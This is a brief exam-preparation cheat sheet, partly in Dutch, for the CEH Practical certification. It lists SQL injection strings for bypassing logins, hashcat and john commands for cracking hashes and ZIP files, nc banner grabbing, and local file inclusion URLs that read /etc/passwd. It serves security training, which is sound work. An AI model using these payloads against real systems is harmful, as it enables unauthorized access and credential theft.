# Practical voorbereiding
https://github.com/CyberSecurityUP/Guide-CEH-Practical-Master

https://ceh-practical.cavementech.com/module-2.-footprinting-and-reconnaissance/1.-footprinting-through-search-engines

https://conflick0.github.io/CEH/

https://github.com/Aftab700/CEH_Notes?tab=readme-ov-file



# bypass login using SQL injection 
username:  ' OR '1'='1' --    
of   
' OR 1=1 --
admin'--
admin' #
admin'/*
' OR 1=1#
' OR 1=1/*

administrator'--
password: blank

#crack hashes
hashid [hash]
hashcat -m [hash_mode] -a 0 [hash_file] [wordlist]

#banner grabbing
nc -v [IP] 80
send >    GET / HTTP/1.1

# DNS
dig website.com ANY

#hidden directories
Dir buster

#crack encrypted ZIP
zip2john file.zip > hash.txt
john --wordlist=wordlist.txt hash.txt

#Local file Inclusion 
detect vulnarability
http://example.com/?file=../../../../etc/passwd
of
http://example.com/show.asp?view=../../../../../Windows/system.ini
http://example.com/view.php?page=../../../../etc/passwd
of document=


#Detect ARP spoofing
ARPWatch




